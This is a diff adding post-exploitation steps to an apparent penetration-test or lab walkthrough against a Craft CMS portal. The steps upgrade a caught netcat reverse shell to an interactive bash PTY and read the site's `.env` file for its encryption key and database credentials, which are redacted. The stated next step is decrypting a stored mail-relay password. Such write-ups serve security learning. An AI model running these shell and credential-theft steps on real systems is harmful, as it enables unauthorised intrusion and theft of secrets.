@@ -1222,7 +1222,91 @@ Key findings:
 - A request timeout on the Kali side is the expected success indicator (the PHP worker blocks while running the shell).
 
 **Next:** From the www-data shell, read Craft's `.env` for the security key and database credentials, then locate where the custom Miles module stores the encrypted mail-relay password.
+<div align="center">
+<br>
+<br>
+</div>
+###### Stabilize the www-data shell:
 
+**Why this step:** The caught shell is a raw `busybox nc -e /bin/sh` with no PTY, so `su`, job control, and line editing misbehave. Upgrade it to a proper bash PTY before post-exploitation enumeration on the portal.
+
+**Command:**
+
+```bash
+python3 -c 'import pty;pty.spawn("/bin/bash")' 2>/dev/null || script -qc /bin/bash /dev/null
+export TERM=xterm
+```
+
+**Breakdown:**
+
+|Component|Reasoning|
+|---|---|
+|`python3 -c 'import pty;pty.spawn("/bin/bash")'`|Allocate a pseudo-terminal and run bash in it, giving the shell a controlling TTY.|
+|`2>/dev/null \| script -qc /bin/bash /dev/null`|If python3 is absent on the target, fall back to `script`, which also allocates a PTY, discarding its typescript to `/dev/null`.|
+|`export TERM=xterm`|Set the terminal type so screen-drawing programs render correctly.|
+
+**Result:**
+
+```
+www-data@portal:~/portal/web$
+```
+
+(Prompt now shows a proper `www-data@portal` bash prompt; the python3 path succeeded.)
+
+**What this gives you:** Key finding: a usable interactive bash shell as www-data on the portal, suitable for database queries and the decrypt step.
+
+**Next:** Move to Craft's web root and confirm the layout (`.env`, `modules/`, `craft` CLI) before reading secrets.
+<div align="center">
+<br>
+<br>
+※※※※※※※※※※※※※※※※※※※※※※※※
+<br>
+<br>
+<br>
+</div>
+
+### 7.3 Read Craft's environment secrets
+
+**Why this step:** With code execution as www-data (7.2), the next move is to recover credentials for a real user. Craft stores its master encryption key and database credentials in `.env`; both are needed to decrypt secrets held in the database.
+
+**Command:**
+
+bash
+
+```bash
+cat /var/www/portal/.env
+```
+
+**Breakdown:**
+
+|Component|Reasoning|
+|---|---|
+|`cat /var/www/portal/.env`|Read Craft's environment file, which holds configuration and secrets injected at runtime (the Twelve-Factor pattern).|
+
+**Result (secret values scrubbed):**
+
+```
+CRAFT_ENVIRONMENT=production
+CRAFT_SECURITY_KEY=<REDACTED_SECURITY_KEY>
+CRAFT_ALLOW_ADMIN_CHANGES=false
+CRAFT_ENABLE_TWIG_SANDBOX=true
+CRAFT_DB_DRIVER=mysql
+CRAFT_DB_SERVER=127.0.0.1
+CRAFT_DB_PORT=3306
+CRAFT_DB_DATABASE=craft
+CRAFT_DB_USER=craftuser
+CRAFT_DB_PASSWORD=<REDACTED_DB_PASSWORD>
+```
+
+**What this gives you:**
+
+Key findings:
+
+- `CRAFT_SECURITY_KEY` recovered: the master key Craft/Yii uses to encrypt and decrypt stored data. Required to decrypt the mail-relay password blob.
+- Database credentials recovered: `craftuser` on local MySQL (`127.0.0.1:3306`), database `craft`. These give read access to Craft's tables.
+- Hardening flags `CRAFT_ALLOW_ADMIN_CHANGES=false` and `CRAFT_ENABLE_TWIG_SANDBOX=true` are set, which rules out admin-settings tampering and Twig template injection as alternate paths and confirms the database-decryption route.
+
+**Next:** Locate the custom Miles module's settings table in the database and pull the encrypted mail-relay credentials, then decrypt the password using Craft's own security component.
 <div align="center">
 <br>
 <br>
